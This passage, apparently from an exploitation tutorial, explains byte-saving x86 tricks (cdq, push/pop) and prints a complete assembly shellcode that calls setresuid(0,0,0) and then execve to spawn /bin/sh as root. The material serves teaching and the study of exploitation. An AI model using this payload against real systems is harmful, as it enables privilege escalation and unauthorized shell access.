A few more bytes can still be shaved off this shellcode
There is a single-byte x86 instruction called cdq, which stands for conver doubleword to quadword
Instead of using operands, this instruction always gets its source from the EAX register and stores the results between the EDX and EAX registers
Since the registers are 32-bit doublewords, it takes 2 registers to store a 64-bit quadword
The conversion is simply a matter of extending the sign bit from a 32-bit integer to 64-bit integer
Operationally, this means if the sign bit of EAX is 0, the cdq instruction will zero the EDX register
Using xor to zero the EDX register requires 2 bytes; so, if EAX is already zeroed, using the cdq instruction to zero EDX will save 1 byte

___________________________________________________________________________
31 D2             xor edx, edx
___________________________________________________________________________

compared to
___________________________________________________________________________
99                cdq
___________________________________________________________________________

Another byte can be saved with clever use of the stack
Since the stack is 32-bit aligned, a single byte value pushed to the stack will be aligned as a doubleword
When this value is popped off, it will be sign-extended, filling the entire register
The instructions that push a single byte and pop it back into a register take 3 bytes, while using xor to zero the register and moving a single byte takes 4 bytes

___________________________________________________________________________
31 C0             xor eax, eax
B0 0B             mov al,0xb
___________________________________________________________________________

___________________________________________________________________________
6A 0B             push byte +0xb
58                pop eax
___________________________________________________________________________

These tricks are used in the following shellcode listing
This assembles into the same shellcode as that used in the previous chapters

shellcode.s
__________________________________________________________________________________
BITS 32

: setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax
  xor ebx, ebx      ; Zero out ebx
  xor ecx, ecx      ; Zero out ecx
  cdq               ; Zero out edx using the sign bit from eax
  mov BYTE al, 0xa4 ; syscall 164 (0xa4)
  int 0x80          ; setresuid(0, 0, 0) Restore all root privs

; execve(const char *filename, char *const argv[], char *const envp[])
  push BYTE 11      ; push 11 to the stack
  pop eax           ; pop the dword of 11 into eax
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; This is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
__________________________________________________________________________________

The syntax for pushing a single byte requires the size to be declared
Valid sizes are BYTE for 1 byte, WORD for 2 bytes, and DWORD for 4 bytes
These sizes can be implied from the register widths, so moving into the AL register implies the BYTE size
While it's not necessary to use a size on all situations, it doesn't hurt and can help readability